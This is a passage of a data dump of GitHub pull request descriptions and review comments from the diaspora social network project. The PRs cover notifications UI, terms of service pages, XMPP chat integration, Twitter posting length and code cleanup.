- polishing","[""When you're in that, what about include the beginning of the post liked / commented / shared like you did in the conversation menu? That would be awesome."", ""@Flaburgan Nice idea! :) I'll try to include that."", ""Love the filters concept, this would be really useful. :)\n\n\nOn Mon, Feb 24, 2014 at 2:17 PM, svbergerem <notifications@github.com>wrote:\n\n> @Flaburgan <https://github.com/Flaburgan> Nice idea! :) I'll try to\n> include that.\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/diaspora/diaspora/pull/4814#issuecomment-35930703>\n> .\n>"", '@Flaburgan \r\n![](https://f.cloud.github.com/assets/3798614/2251074/2bc3562c-9d98-11e3-8576-69592c2649cc.png)\r\n\r\n\r\nI just added the post title we also display in the SPV.', 'Nice :D', 'The notifications view on mobile devices (with enforced pagination):\r\n![](https://f.cloud.github.com/assets/3798614/2251824/0968e9e4-9da1-11e3-9e71-e6458aa88279.png)\r\n![](https://f.cloud.github.com/assets/3798614/2251825/096af324-9da1-11e3-836d-6f37b27e976a.png)\r\n', 'Hm, on mobile I think a combobox to select which notification display would be better, the selector is too big here.', '@Flaburgan You are right, but IMO the biggest problem right now on mobile devices is the header. I am not trying to make the notifications view 100% compatible for mobile devices but as soon as we have a working header there is not much that needs to be done to gain that compatibility.', ""@svbergerem since https://github.com/diaspora/diaspora/pull/4673 the mobile header is completely different. Is it because you are using bootstrap that you don't have it?"", 'Now that I\'m looking more precisely to your screenshots, it looks like what you described as ""mobile"" is just the desktop version with a small screen resolution, it\'s not the mobile version at all.', '@Flaburgan Exactly.', ""RSpec fails with\r\n\r\n<code>undefined method `post_page_title' for #<RSpec::Core::ExampleGroup::Nested_44::Nested_2::Nested_1:0x00000012df8a60></code>\r\n\r\nI used that method to display the post title for likes, mentions, comments and reshares. Any idea how to fix that? (I don't know how RSpec works)"", 'For the RSpec failure try to add `include PostsHelper` to the `NotificationsHelper` module. This more of an Rails issue than an RSpec issue ;)', '@MrZYX Thank you for your help. I am still not familiar with RoR code.', 'Hovercards!\r\n![](https://f.cloud.github.com/assets/3798614/2397495/3c52167c-a9eb-11e3-88e5-9292e5cfe4ad.png)\r\n\r\n', '\\o/ once again, please try to keep the current colors used in diaspora', '@Flaburgan Thank you for reminding me. I have changed the colors and updated the screenshot.', ""The dates don't have a grey background but I'm fine with it.\r\nAlso, did you notice that the fonts are different? This is true for every bootstrap pages:\r\n![capture du 2014-03-12 14 45 08](https://f.cloud.github.com/assets/930064/2397627/ce015ece-a9ec-11e3-82cf-534adea12ebf.png)\r\n"", '@Flaburgan I removed the grey background. If anyone wants that back we can talk about that as soon as I start polishing stuff.\r\n\r\nI noticed the different fonts. We use Roboto for bootstrap pages.', 'there is ``body {    font-family: ""Helvetica Neue"",Helvetica,Arial,sans-serif; }`` So I guess Helvetica Neue is used in blueprint, could you please have a look?', 'That is right for most of the website. The buttons use the system font.', 'I think I am done. Now might be the perfect time to add suggestions. (@goobertron)\r\n![](https://f.cloud.github.com/assets/3798614/2415237/acafc2e0-aaf2-11e3-98ff-39ad42d1dc2c.png)\r\n![](https://f.cloud.github.com/assets/3798614/2415238/acb1da44-aaf2-11e3-8518-ad2c4b11dca4.png)\r\n', 'I noticed a transparency problem in develop in the dropdown of the hovercard, do you reproduce this problem here?', ""@Flaburgan Could you be more specific? I wasn't able to reproduce that anywhere."", ""@svbergerem hm, I don't reproduce with my laptop. I'll check again tomorrow at work and make a screenshot"", ""@svbergerem here is the bug: \r\n![capture du 2014-03-14 11 12 45](https://f.cloud.github.com/assets/930064/2419620/74c0336e-ab61-11e3-96ff-14ae129d57ae.png)\r\n\r\nBut I'm experiencing it with Firefox Nightly (30) so not related. If it's still there when FF30 will be in Aurora state, I'll open an issue.\r\n\r\nAbout polishing, I think that quote made with \xc2\xbbcontent\xc2\xab, like in the conversation view, is not the best rendering we can have. Maybe just italic? Looks more comprehensive to me. \r\n"", '@Flaburgan You are right about the quotes. Here are 3 versions:\r\n![notifications_normal_vs_italic](https://f.cloud.github.com/assets/3798614/2421018/ff522338-ab7b-11e3-99ee-8d3c95446208.png)\r\nThe first is the old one, the second uses a normal font, the third one uses an italic font. I am not sure if version 2 or 3 is the best one. What do you think?\r\n', 'Oh, I just realized that citations are not what I thought it was! I thought citations were for comment notifications only, and the citation was the comment posted, not the post commented.\r\n\r\nSo IMO the second one is perfect for every type of notifications. For the comment one only, we could imagine adding a line before the timeago which would contain the beginning of the comment.\r\n\r\nAnd another question about comment notification, are you linking to the post, or to the comment itself?', ""My vote would be for the second option, normal upright text with no quote marks. This is how post titles are presented in Deus Figendi's user script which I've been using for ages, and it looks very natural to me to have post titles presented that way."", ""@Flaburgan AFAIK we don't save anywhere which comment triggered the notification so adding the beginning of the comment or linking to the comment would be much more work and would be definitely out of scope of this PR. Nevertheless I think that this would be a good idea.\r\n\r\n@goobertron The second version is now implemented in this PR.""]"
202,diaspora/diaspora,5104.0,"If enabled, terms of service link will be shown in sign up page.

[Base for discussion on Loomio](https://www.loomio.org/d/ezlIV5rN/add-tos-and-pp-documents-for-podmins-to-use?proposal=k0LZg1M9#comment-128186).

So yeah, if enabled (default false), /terms route will work and contain either the basic template (default.haml) or custom written by podmin (terms.haml). Same templates are used for mobile too - we shouldn't duplicate these I think.

Also I'm sceptical whether there is need to allow somehow creating different language versions. Podmin can write it in whatever language they want or in different languages.

No tests yet, should probably write something for the setting <-> route functionality. Also is this as a feature something we want? Also the base template would need some discussion.

The terms are from [here](https://github.com/jaywink/terms-of-service) - though a little modified in this pull. I'm going to just delete that old repo. I've taken a print out from my local dev box for a little more convenient viewing :) [Check it out here](https://cloud.jasonrobinson.me/public.php?service=files&t=5e0e94be26f0a11b4a810d2bc72c5993).","[""I'm so happy to see that this is a thing! :D"", ""Brilliant, thanks for doing this. I'll look at it properly tomorrow. Have made a few initial comments/queries. Hope that's OK."", ""> Also I'm sceptical whether there is need to allow somehow creating different language versions.\r\n\r\nI think it would be good to allow translations of the default, but obviously if a podmin creates their own or amends the template, that won't be translated - but it would be good for a podmin to be able to amend the default from whatever language they want, not just English.\r\n\r\n> I'm going to just delete that old repo.\r\n\r\nWould you mind leaving it for a while, as I would like chance to look through it and perhaps edit some of the text. Apologies I hadn't managed to do this before - had forgotten, if I'm completely honest."", ""> I think it would be good to allow translations of the default, but obviously if a podmin creates their own or amends the template, that won't be translated - but it would be good for a podmin to be able to amend the default from whatever language they want, not just English.\r\n\r\nI'm a little worried this adds a huge amount of strings to translations. Also there is the problem that these will go to all pods using the base template. I certainly wouldn't want any random translations becoming *my pod* terms of service."", ""> Would you mind leaving it for a while, as I would like chance to look through it and perhaps edit some of the text. Apologies I hadn't managed to do this before - had forgotten, if I'm completely honest.\r\n\r\nThis pull has already some changes relating to the text - please don't read the old repo, read the file here - or the PDF. Maybe we should dump the texts on some collab editing thingy?"", ""> I'm a little worried this adds a huge amount of strings to translations. Also there is the problem that these will go to all pods using the base template. I certainly wouldn't want any random translations becoming my pod terms of service.\r\n\r\nYou're right that such translations shouldn't be provided as i18n localisations. The *podmin* should be able to choose which language the ToS is displayed in; the translation shouldn't be served based on each user's language. Therefore it would be good to have translations of the template available for podmins to pull and use, but not given in the locales."", ""> You're right that such translations shouldn't be provided as i18n localisations. The podmin should be able to choose which language the ToS is displayed in; the translation shouldn't be served based on each user's language. Therefore it would be good to have translations of the template available for podmins to pull and use, but not given in the locales.\r\n\r\nOK sure that could be an option. Maybe an additional setting? Though I'm tempted to leave this for improvement?"", ""> Maybe an additional setting? Though I'm tempted to leave this for improvement?\r\n\r\nSure, could be an enhancement in future PR. We'll need to think about the best way to implement it, in any case."", 'Btw, I\'m not sure anyone realizes (I\'ll provide a more clear for review doc of the default terms rendered with all options in a bit), but currently in the default terms the podmin email is rendered as a way to give feedback on the terms and ask question about the privacy policy. I think this is super important - tired of people complaining on Twitter that they don\'t know how to contact the person running a pod.\r\n\r\nAny opposition to this? I\'ll add a clarifying note to the diaspora.yml.example too if not. If there is opposition, I suggest a new setting then, `settings.terms.contact_email` - which would be optional and rendered only if it is filled, like now only the ""contact"" strings are rendered if podmin email is filled.', ""We already have podmin_email: 'podmin@example.org' which is used inside diaspora* in the right side panel. I agree that a way to contact the pod should be present outside diaspora, especially on the error pages https://github.com/diaspora/diaspora/issues/4016"", 'So some screenshots;\r\n\r\n![selection_072](https://cloud.githubusercontent.com/assets/1174866/3863685/16fc64c2-1f4d-11e4-8743-0ae36b8aa0a1.png)\r\n![i like toast - chromium_073](https://cloud.githubusercontent.com/assets/1174866/3863688/1b686830-1f4d-11e4-93a5-f922a181bd4b.png)\r\n![selection_074](https://cloud.githubusercontent.com/assets/1174866/3863691/1f652e00-1f4d-11e4-8545-97f823d5f1e3.png)\r\n\r\nNote! The screenshot of I Like Toast /terms is not the production server - if you go there you will get 404 until the new WIP server goes live :)\r\n\r\nNew PDF with text for easier reading: https://cloud.jasonrobinson.me/public.php?service=files&t=d0c74ec81b5b9161f87942eab5e80b92', 'Looks fine to me, except maybe for the horrible contrast of the blue link on the green background of the sign page. Maybe try moving that into the white box of the form?', ""Re the blue link on green background - that sign-up page seriously needs a redesign, and hopefully that will happen before the next major release. I've been meaning to work on it, and Pablo C\xc3\xbabico was keen to help."", 'I don\'t think the ""you accept the terms"" text should be in the white box - it should be just over the button so it will not be missed when clicking, IMHO.\r\n\r\nWhat about this? Basically just forcing an underline and inheriting the text colour?\r\n\r\n![selection_078](https://cloud.githubusercontent.com/assets/1174866/3944734/9dfcc112-2617-11e4-9788-804ec46d1d91.png)\r\n', ""That's a good solution to the sign-up page."", 'So made (most of) the requested changes and rebased.\r\n\r\nAny tests needed - not really sure what would be good. Maybe a cuke? Also, should this be in the major version or is it ok to push it in a minor if it gets ready in time?', ""Well, I guess adding something as major as a ToS and privacy policy will by default make whichever release this is part of into a major version, won't it?"", ""> Well, I guess adding something as major as a ToS and privacy policy will by default make whichever release this is part of into a major version, won't it?\r\n\r\nYes that could be the argument. Though since this doesn't actually change anything since by default the ToS feature is off, one could argue it could be shipped in a minor. I'm fine with whichever :)"", 'I have no problem to ship that in a minor.', 'Alright, thank you.', 'Hey, nice work guys! @jaywink imo we need an addition to the changelog to indicate to podmins that this is now possible and how to easily add their own terms. Could you please add that?']"
203,diaspora/diaspora,5122.0,"Integrated feature
Added tests
In response to a users request(Issue #5113) i have added a feature that allows users to mark all notifications in the current notfication filter they're on as read without marking all the others read, i have also added tests for this feature in spec/controllers/notifications_controller_spec.rb","['Alright Ill get it all fixed up!', 'Thank you!', '@jaideng123 Was that your first contribution? Thanks a lot!', 'Yeah it was! no problem!']"
204,diaspora/diaspora,5073.0,"Open :

- [x] ~~mixed content; writing reverse proxy for rails application?!~~ using webserver as proxy solves it
- [x] login with user credentials from external (authentication works; something else broken?!)
- [x] pod federation (was not tested yet)
- [x] move vines configuration to diaspora.yml
- [x] make jsxc text translatable
- [x] history / offline messages (see diaspora/vines#19)
- [x] write huge amount of tests (see vines tests)

(to be extended)

**I as a Pod Maintainer, what do I have to configure to make that work?**

* Apply the patch
* If you are using ssl
 * Apache: https://gist.github.com/Zauberstuhl/2d09330961614b12b642
 * Nginx: https://gist.github.com/Zauberstuhl/ee95e1eacefa6ddbec6e (no tested)
 * un-comment the bosh server variable ""bosh_url"" in diaspora.yml
* Restart diaspora

That was the magic!

**Your XMPP server sucks! I have my own already running!**

* Set ""server"" variable to false in diaspora.yml under chat section
* Follow the web-server configuration above
* Make sure the bosh url in diaspora.yml and of your xmpp server are the same
* Restart diaspora

**How can I add user/friends to my contact list?!**

Diaspora has standards like XMPP presence:

* both parties are not sharing with each other (equals XMPP 'none')
* you are sharing with the contact but your contact doesn't (equals XMPP 'to')
* the contact is sharing with you but you doesn't (equals XMPP 'from')
* you and your contact are sharing with each other (equals XMPP 'both')

Jappix is only displaying ""online"" contacts and you can see the presence of the contact if you and your contact are sharing (XMPP 'both')!

---

~~Everything written under `lib/vines*` was forked from https://github.com/negativecode/vines
except for `lib/vines/storage/diaspora.rb` and some minor tweaks on the configuration process~~
We moved the xmpp server to a extra [location](https://github.com/diaspora/vines).","[""Okay, my first issue with this: it's too big. I see two things to do to greatly reduce the size of the PR which means it'll be much much easier to review, it won't bloat the repo and codebase as much and it'll be much much easier to maintain.\r\n\r\nFirst, make use of the [vines](http://rubygems.org/gems/vines) gem. If that's for some reason impossible, make a fork of the gem and publish that. We can totally talk about adding a diaspora/vines repository for that.\r\n\r\nThe second thing is to make a [Bower](http://bower.io/) package for Jappix mini. That allows to pull it in as a gem via [Rails assets](https://rails-assets.org/). Here again we can totally talk about a diaspora/bower-jappix-mini repository."", '@jhass agree. I already created and used https://rubygems.org/gems/diaspora-vines . I was not sure what the best way would be.. that was a 50:50 chance .. and I took the wrong.\r\n\r\nRegarding bower, I was not aware of that. I will clean the PR up asap.', '> mixed content; writing reverse proxy for rails application?!\r\n\r\nThis seems to be relevant to #4687', ""I had just prepared a dev environment and got myself qucik Ruby/ROR courses to implement chat. I was working on prosody with websocks (not BOSH), and was looking at using strophe.js to implement the chat.\r\n\r\nWith websocks, there shouldn't be a need for a reverse proxy, right? Or did I misunderstand what you meant by reverse proxy?\r\n\r\nHow can I help test this since my dev site is up and running? Mind you I'm a newbie with ROR and trying to get my feet wet and will definitely be asking dumb questions."", '@ominds : No, that is a general problem (more a security aspect then a problem). If you load from a secure connection un-encrypted content (see  [mixed content](https://developer.mozilla.org/en-US/docs/Security/MixedContent)). ', ""@jhass : the problem with bower is : is css files are packaged in a bower package with all tha jappix files, how could I use the inheritance capacity of SCSS to make the UI consistent with the D* design, since the stylesheets aren't in the same directory ?"", ""I'd rather like to see overrides (see [CSS specificity](http://www.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/)), that'll be much easier to maintain."", ""I might be a possibility, but a CSS file standing anlone in the middle of others and related to no specific file other than this package's, it would be awkward, no ?"", ""@jhass do you think a proxy for mixed content would be merged? If so, I'd start working on this issue."", ""I don't know. I've no doubts about support for being able to use such a thing, but it should be entirely optional IMO."", ""I'll move the `config/vines/` directory tomorrow \r\n\r\n~~Vines is located here [diaspora-vines](https://github.com/zauberstuhl/diaspora-vines) ([rubygems](https://rubygems.org/gems/diaspora-vines))\r\nJappix is located here [bower-jappix-mini](https://github.com/zauberstuhl/bower-jappix-mini) ([rails-assets](https://rails-assets.org/components))~~\r\n\r\nWe should move that to an official repo later!"", ""A quick q, during my checks on prosody I found two ways for communication. Via bosh and via websockets which is more efficient and solves the cross-domain issues. Is there some reason why bosh was chosen here?\r\n\r\nHere's the draft spec, it's implemented by many XMPP servers\r\n\r\nhttp://tools.ietf.org/html/draft-ietf-xmpp-websocket-07\r\n\r\nAlso, how are you handling the cross-domain issue. [CORS](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing)?"", '@ominds do not mix ""cross-domain"" with ""mixed-content"" and with websockets it seams to be the same if you connect from a secure to an unsecure connection:\r\n\r\n`[Exception... ""The operation is insecure.""  code: ""18"" nsresult: ""0x80530012 (SecurityError)""  location: ""<unknown>""]`\r\n\r\nWhich really makes sense cause it is a security aspect.\r\nYou can only pass that by using secure <-> secure (via proxy or separate certificate)!', '@Zauberstuhl  I understand the difference. mixed-content happens when a secure page contains resources from insecure pages (images, etc). Cross domain is the restriction for communication between different domains via XHR calls.\r\n\r\nI was just wondering why you went with BOSH rather than websockets which are both supported by most XMPP servers. Websockets being better in performance.', '>Vines is located here diaspora-vines (rubygems)\r\n\r\nPlease change the hompage link to your repo or diasporafoundation.org.', ""I have some concerns about the Jappix Mini code. I'd like to implements a few features and fix some issues on Jappix Mini but this would require to deeply modify the Jappix Mini Origina code.\r\n\r\nI wanted to know any element could interfere with these plans ?\r\n"", ""I'd still like to see that as a fork and maintained in a separate repository, maybe we can eventually even upstream some of these changes."", ""Sorry, I don't understand what you mean. A fork of what ? Jappi Mini ? Maintained in a searate repository from... ?"", ""Yes, a fork of Jappix Mini, maintained in a separate repository from the one this PR goes to ;)\r\n\r\nProbably also a separate bower package then to make clear to others that it's a modified version."", 'Oh yes ! Well Zauberstuhl did a [bower package](https://github.com/Zauberstuhl/bower-jappix-mini).\r\nSo this package, as soon as it is presented as a fork, does not interfere with deeply modify it ?\r\nGreat. I think we should specify the original license though ?', 'Yeah, keeping the license will cause the least headaches. I still would look into at least renaming that package though.', 'Into what ? bower-jappixmini-diaspora ?', 'For example, just making sure this is not simply a packaged upstream.', 'Ok, we are going to do it. Thanks for the advice.', ""I pulled this and started the server, it seems vines is started, but there's nothing in the UI for chat. Sorry if this is a newbie question but I'm very new to ROR. Is there something else I should be doing to see chat running?"", '@ominds you executed bundler after pulling?', '@Zauberstuhl I assume you mean by bundler this command\r\n\r\nRAILS_ENV=development  bundle install\r\n\r\nYes. I executed it.', '@ominds normally `rails-assets-jappix-mini` should be installed on default. do you deactivate the front-end accidentally in diaspora.yml (if not set it explicitly to true)?\r\n\r\ncheers\r\n\r\n', 'If you need to add an empty directory to the repo, the convention is to add a `.gitkeep` file, not `.placeholder`', ""When I run ./script/server (or vines start), I'm getting \r\n\r\nlog level must be one of: debug, info, warn, error, fatal\r\n\r\nHere are the gems I'm using\r\n\r\nUsing rails-assets-jappix-mini 0.1.3\r\nUsing diaspora-vines 0.4.9.diaspora.0.1.1\r\n\r\nconfig/vines.rb on line 5 seems to be setting level to debug, but it seems the code doesn't reach there for some reason. (I tried a puts in there but it's just not printing)""]"
205,diaspora/diaspora,5435.0,"Results : 

![modal_mention](https://cloud.githubusercontent.com/assets/6507951/5229554/8fce6ce6-7719-11e4-9088-5815a4414df7.png)
![modal_mention2](https://cloud.githubusercontent.com/assets/6507951/5229556/92582e8e-7719-11e4-94b3-5d50c35fdcf4.png)

I wanted to add 
````
#new_status_message_pane .modal {
  padding-bottom: 35px; /* or something else */
}
````

But I wasn't sure (little bit ugly).","['Great... Gemfile has been pushed. I have to do once again ````git rebase -i upstream/develop```` ?\r\n\r\nSorry again.', ""Ok, I think it's ok now (I hope). Thank you :) "", 'Thank you!']"
206,diaspora/diaspora,5417.0,"![no notifications yet](https://cloud.githubusercontent.com/assets/3798614/5157613/b779053c-7316-11e4-9d4f-4d51df7c5322.png)

#4866","['I moved the code to a helper function and added a test. Should be ready to merge now.', 'Thanks!']"
207,diaspora/diaspora,5646.0,"Fix for #4572, #4818 and #3998. I still need to add some tests but the code I wrote so far should be ready to review. Especially the controller changes might need some improvement. (was more or less trial and error)","[""Hm, it's probably not related to what you changed here but did you have a look at https://github.com/diaspora/diaspora/issues/5330 in the same time? This is a regression which is not in the current master, so it would be nice to see it fixed."", '@Flaburgan No. As you said this is not related and in this PR I just want to fix the issues I already mentioned.', 'All tests succeeded. Should be ready to review and merge.', 'Looks solid, thank you!', 'Looks like we now have a problem trying to access the conversation page:\r\n\r\n<pre>Processing by ConversationsController#index as HTML\r\n  Rendered conversations/_conversation.haml (89.6ms)\r\n  Rendered conversations/index.haml within layouts/with_header (92.1ms)\r\nCompleted 500 Internal Server Error in 353ms\r\n\r\nActionView::Template::Error (undefined method `conversation_class\' for #<#<Class:0x0000326af217e0>:0x0000326afc3d10>):\r\n    3: -#   the COPYRIGHT file.\r\n    4: \r\n    5: .conversation-wrapper{ :""data-conversation-path"" => conversation_path(conversation) }\r\n    6:   .stream_element.conversation{:data=>{:guid=>conversation.id}, :class => conversation_class(conversation, unread_counts[conversation.id].to_i, selected_conversatio\r\nn_id)}\r\n    7:     .media\r\n    8:       .img\r\n    9:         - other_participants = ordered_participants[conversation.id] - [current_user.person]\r\n  app/views/conversations/_conversation.haml:6:in `_app_views_conversations__conversation_haml__704969970413809694_108277623820\'\r\n  app/views/conversations/index.haml:20:in `_app_views_conversations_index_haml___1310477773073387960_108271293020\'\r\n  app/controllers/conversations_controller.rb:32:in `index\'\r\n  lib/rack/chrome_frame.rb:39:in `call\'\r\n  lib/unicorn_killer.rb:35:in `call\'', '@Flaburgan +1, but no problem on mobile', 'Looks like something went wrong during the assets compilation, I cleaned them and re precompile them and now everything is fine.']"
208,diaspora/diaspora,4004.0,"#3324

![01](https://f.cloud.github.com/assets/1108789/188982/0640d92e-7e2c-11e2-8d39-33a0017caf2e.png)

![02](https://f.cloud.github.com/assets/1108789/188983/0a973856-7e2c-11e2-9451-2dd7af5e1af4.png)

![03](https://f.cloud.github.com/assets/1108789/188984/11726358-7e2c-11e2-8a94-b35e84bc7732.png)

","['yeeha !', 'Oks ready to dance. Travis is happy :]', 'And lets add some English: ""Add the ability to upload photos from the mobile site"" ;)', 'Oks, these are ready to party.', 'Awesome, thank you!']"
209,diaspora/diaspora,5707.0,"Needed for #5480.

This PR tries to unify [header.js](https://github.com/diaspora/diaspora/blob/develop/app/assets/javascripts/widgets/header.js), [notifications.js](https://github.com/diaspora/diaspora/blob/develop/app/assets/javascripts/widgets/notifications.js) and [notifications-badge.js](https://github.com/diaspora/diaspora/blob/develop/app/assets/javascripts/widgets/notifications-badge.js) with [notifications-view.js](https://github.com/diaspora/diaspora/blob/develop/app/assets/javascripts/app/views/notifications_view.js) and port everything to Backbone.

Almost done. Steps left to go :

 * [X] have a beer,
 * [X] have another beer,
 * [X] code the darn thing and write some tests,
 * [X] fix the [failing Cucumber test](https://travis-ci.org/diaspora/diaspora/jobs/52569805#L1366),
 * [X] fix the [failing Jasmine tests](https://travis-ci.org/diaspora/diaspora/jobs/52569803#L1750),
 * [X] find a proper way to deal with [inline JS](https://github.com/AugierLe42e/diaspora/blob/port-notifications-backbone/app/assets/templates/header_tpl.jst.hbs#L111),
 * [X] find someone to suffer on reviewing that mountain of crap.","['It starts to be big. Should I try to only solve the problems and seperate further modifications in a separate PR ?', 'In the notification dropdown the tooltips are only working after you clicked on the entypo icon.', 'How is it possible ? Let me check that.', 'Thank you.']"
210,diaspora/diaspora,5792.0,"- added shoulda-matchers gem for one-line specs
- added FactoryGirl syntax methods

Partial fix for https://github.com/diaspora/diaspora/issues/4020

I also added a few validations that seemed to make sense for roles, and tweaked the ```Role.is_admin?``` method to return a boolean. Hopefully CI will catch any issues that these changes may cause, but please let me know if I should back out any of those changes to the model itself.","[""Mh, I'm not sure I like shoulda-matchers, it feels inconsistent with the expect syntax."", ""@jhass, the one-line syntax used by shoulda-matchers is supported by RSpec, even when using the expect syntax: https://github.com/rspec/rspec-expectations/blob/master/Should.md#one-liners\r\n\r\nI feel that the inconsistency is a small trade-off for being able to write a one-liner instead of multiple lines. It's a solid Thoughtbot gem with great support & [documentation](http://matchers.shoulda.io/). It's probably saved me hundreds of hours and thousands of lines of spec code over the years. Check it out...let me know what you think...and in the meantime, I'll start making Hound happier... :smile: "", 'Mh, okay deal, we can try it for a while.', 'Thank you!']"
211,diaspora/diaspora,5798.0,,['Thank you!']
212,diaspora/diaspora,5850.0,Fixes #4939.,"['Ready to review.', 'Thanks1']"
213,diaspora/diaspora,5852.0,"Solve #3393 Continues PR #3919

I need code review, specially in the migration file. It has a complex query that I didn't know how to write it in Ruby style.","['Improvement: when participation.count == 0 -> destroy , included in migration', 'Created Participation.unparticipate! , called when user retract a participation.\r\n\r\nFeedback, welcome, specially related to tests.', '""Unparticipating"" when destroying \'like\' or \'comment\'\r\n\r\nMigration increased in complexity, due poll participation is an accountable participation as well.', 'Thank you!', 'Welcome! This PR ley me learn about cucumber. Amazing tool, easy to ensure features functionality and quality.', 'I just upgraded my pod from 0.5 to 0.6-pre and the db migration toke ages. I run postgreSQL with a ~10GB database. Any chance the migration time can be improved?', ""> the db migration toke ages.\r\n\r\nI think is the cost of a single update query.\r\n\r\n> Any chance the migration time can be improved?\r\n\r\nOf course there is. Please, I don't have such a big db to test my suggestions properly, may you run them?"", 'Sure, you give me the file you want me to test.']"
214,diaspora/diaspora,5877.0,"there were mails like this:
> XYZ liked your post:
> 
> There's a new private message in diaspora* for you to check out.",[':cookie: ']
215,diaspora/diaspora,5883.0,"on the contacts page, external urls were used without camo",['Thank you!\r\n\r\n:cookie: ']
216,diaspora/diaspora,5559.0,"(Re)Added aspect sorting with minimal jquery ui.

* Please have a look at the gem file, i haven't got it working with a version added:
> Could not find gem 'jquery-ui-rails5.0.3 (>= 0) ruby' in the gems available on this machine.

* jQuery AJAX request throws js warning because of the empty response.","['Thanks for your work. I did took a closer look, but two hints:\r\n\r\n- Please specify a version in the `Gemfile` to avoid confusions with gem version upgrades\r\n- Please write tests for any new functionality you implement. You can find some information about our testing workflow [in the wiki](https://wiki.diasporafoundation.org/Testing_workflow), you can also ping us in `#diaspora-dev` on freenode if you need help.', ""@SWW13 Oh, you updated this PR. :) Please add a comment when you fix stuff and think that we should review the PR again.\r\n\r\nI tested your code on my dev pod and it is working really well. Your js code is only needed for the contacts page so I think you can move it to `app/assets/javascirpts/app/pages/contacts.js`. Maybe add it to a function called `setupAspectSorting` or something similar and call that function from the initialize function.\r\n\r\nYou added a test for the aspect_order function you wrote. I think it would be great if there would be another test to make sure that the drag and drop in the UI really reorders the aspects and that the order stays the same when you reload the page. I guess that could be a cucumber test. However it looks like the `drag_to` method doesn't work with jQuery UI sortable. There is a [workaround](https://github.com/mattheworiordan/jquery.simulate.drag-sortable.js) but I don't know what would be the best way to integrate that so someone else would have to help.\r\n\r\nYou added the correct version to the `Gemfile` but in `Gemfile.lock` the version is still missing. I guess calling bundle another time could fix that problem.\r\n\r\nThe ruby code has to be reviewed by someone else."", 'Thank you!', ':cookie: ']"
217,diaspora/diaspora,6097.0,Close https://github.com/diaspora/diaspora/issues/5339,"['@jaywink is http://the-federation.info updated to check the new syntax? Maybe you want to still support both syntaxes for pod which are still running 0.4.\r\n\r\n@dmorley same remark for http://podupti.me', '@Flaburgan not up to date yet, will need to update asap once this is merged in :)\r\n\r\nNote, however merges this is - as agreed earlier, this is 0.6 stuff, not a minor release.', ""Hmm, might as well merge now - thanks!\r\n\r\n@dmorley - pods running on develop will not show with correct services after they pull this in so time to update the code if you haven't already. I'd suggest supporting the old services keys until forever for old pods, friendica and redmatrix.""]"
218,diaspora/diaspora,4139.0,"Addressing issue https://github.com/diaspora/diaspora/issues/4113 , I grepped around the project looking for Ruby 1.8.7 hacks and removed all I found.","[""Here's another one: https://github.com/diaspora/diaspora/blob/develop/app/models/acts_as_taggable_on/tag.rb#L10"", 'PR updated. Thank you for your feedback!', 'Travis failed with this error message: Could not fetch specs from https://rubygems.org/. Probably issues with the CI? I think tests passed because the first 3 jobs were successful... My local run was correct.', 'Yup, just a hiccup on CI, I retried the build and it went through. Please add a changelog entry and we can merge :) ', 'Done!', 'Thank you!']"
219,diaspora/diaspora,4187.0,Fixes #2758,"['Hmm actually noticed that the length is still calculated wrongly if the post has more than one url .... will fix and udpate', ""OK so nothing was really using service.public_message except Twitter and much of the logic there needed to be on the Twitter subclass so I refactored things around a bit to make things cleaner.\r\n\r\nTwitter post length should now always (hopefully) calculate correctly. It might be over max length when posted via Twitter API, but Twitter shortens all links to 21 chars. That is why test doesn't check for exact 140 chars."", ""....and of course a real test on my own pod still doesn't seem to work :angry: \r\n\r\nWill look into this again tomorrow."", ""OK I'm very confident Twitter posting is working now for all sizes of posts. Interestingly enough after exhausting debugging I couldn't really verify why some posts fail. I can verify that the post is being truncated to exactly the correct length from the logs. Sometimes it seems the Twitter API gives us a few characters less due to reasons I cannot explain since messages leaving our side are exactly maxsize after taking in to account that Twitter makes all URLS in to 21 char length regardless of being short or long.\r\n\r\nAnyway, in the end I implemented a retry for Twitter posting and I have verified it with many different length posts."", 'Forgot to check post_to_service test :)', 'Rewritten. Unfortunately will have to now do some testing for the logic, unless the code looks ok for sure..', ""OK I've tested with my earlier test cases that the post that before the fix didn't go through does go through as it did before the latest refactoring.\r\n\r\nIf someone wants to check against in a non-fixed pod, try this post which fails even though after taking account urls, post url and truncation, it should go through at exactly 140 chars. Instead it fails, but goes through if the calculation is made with 135 chars.\r\n\r\n```\r\nSaucy's Smart Scopes come with on-demand refined search and 1-click away enable/disable functionality | Iloveubuntu: Ubuntu blog - http://www.iloveubuntu.net/saucys-smart-scopes-come-demand-refined-search-and-1-click-away-enabledisable-functionality - \r\n\r\n![pic](http://iloveubuntu.net/pictures_me/specific%20search%20saucy%20smart%20scopes.png)\r\n\r\n<p><i>Hours ago, the Smart Scopes project landed in Saucy Salamander by default (via the regular updates), implementing a numerous pack of new scopes (data sources).<br>Along with the already-known traditional features of the scopes (Unity Previews, etc), the newly-landed scopes come with interesting functionalities and behaviors.</i></p>\r\n\r\nhttps://www.youtube.com/watch?feature=player_embedded&v=G4Lb-edd3f0\r\n\r\n#ubuntu #saucysalamander\r\n```\r\n\r\nWhen calculating with 135 this is the result that fails:\r\n\r\n> Saucy's Smart Scopes come with on-demand refined search and 1-click away enable/disable functionality | Iloveu... https://iliketoast.net/p/38870\r\n\r\nWhen calculating with 140 this is the result and goes through:\r\n\r\n> Saucy's Smart Scopes come with on-demand refined search and 1-click away enable/disable functionality | Iloveubuntu... https://iliketoast.net/p/38870\r\n\r\nThe one that goes through is 144 chars, the one that fails is 149 chars. I didn't try any between values, just decreased by 5 chars. Please note that the real length is -9 chars because the URL of the post is 30 chars and Twitter shortens/lengthens all urls to 21 chars exactly.\r\n\r\nAnyway, if no one has problems with this, would be nice to get this fix for 0.1.1 release :) "", 'Looks reasonable enough to me, thank you!']"
220,doorkeeper-gem/doorkeeper,387.0,"Per our conversation at #383

